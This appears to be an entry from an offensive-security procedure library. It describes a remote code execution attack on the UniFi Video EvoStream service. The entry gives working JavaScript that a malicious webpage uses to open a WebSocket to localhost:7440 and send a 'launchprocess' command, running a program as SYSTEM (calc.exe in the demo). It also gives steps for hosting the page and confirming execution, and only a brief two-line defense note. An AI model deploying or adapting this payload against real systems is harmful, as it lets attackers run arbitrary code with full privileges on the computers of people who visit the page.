---
tags:
  - rce
  - javascript
  - websocket
type: procedure
tools:
  - '[[tools/poc.py]]'
  - '[[tools/rce0923234.html]]'
  - '[[tools/unifi-video.Win7_x64.v3.10.7-beta.2_ee88ac.190725.1817.exe]]'
  - '[[tools/2019-04-21_17-47-17.mp4]]'
  - '[[tools/ubiq_rce.mp4]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/launchprocess-websocket]]'
platforms:
  - Windows
  - Web
techniques:
  - '[[Command-Line Interface]]'
  - '[[Exploitation of Remote Services]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques:
  - '[[JavaScript]]'
id: d5bfc9eb-b4c6-47d6-92ce-8194f863aa2f
created_at: '2025-12-11T06:10:22.817Z'
updated_at: '2025-12-11T06:10:22.817Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
  - '[[T1210]]'
---
# Develop Remote Code Execution Payload

## Summary

This procedure develops a JavaScript payload hosted remotely to achieve RCE by sending WebSocket requests to the localhost EvoStream API.

## Description

By hosting a webpage that executes client-side JavaScript, attackers bypass localhost restrictions and trigger 'launchprocess' commands as SYSTEM, demonstrated by launching calc.exe.

## Requirements

1. Ability to host [[tools/rce0923234.html]] on a remote server
2. Target user visits the malicious webpage
3. EvoStream service exposed on target

## Defense

Defensive measures and detection strategies:

- Block localhost WebSocket connections in browsers
- Add API authentication

## Objectives

1. Achieve remote command execution as SYSTEM
2. Demonstrate via video
3. Bypass local restrictions

## Instructions

### Step 1: Host JavaScript Payload

**Context**: Set up the remote HTML file with WebSocket code.

Host [[tools/rce0923234.html]] containing:

```javascript
var ws = new WebSocket('ws://localhost:7440');
ws.onopen = function() {
    ws.send('{"command": "launchprocess", "binary": "calc.exe"}');
};
```

> Access the page from the target browser.

### Step 2: Trigger and Verify

**Context**: Observe command execution on target.

Execute [[commands/launchprocess-websocket]] via the payload.

> Confirm calc.exe launches as SYSTEM.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]
- [[Exploitation of Remote Services]]

### Sub-Techniques

- [[JavaScript]]

## Commands Used

- [[commands/launchprocess-websocket]]

## Tools Used

- [[tools/rce0923234.html]]

## Tags

- rce
- javascript
- websocket
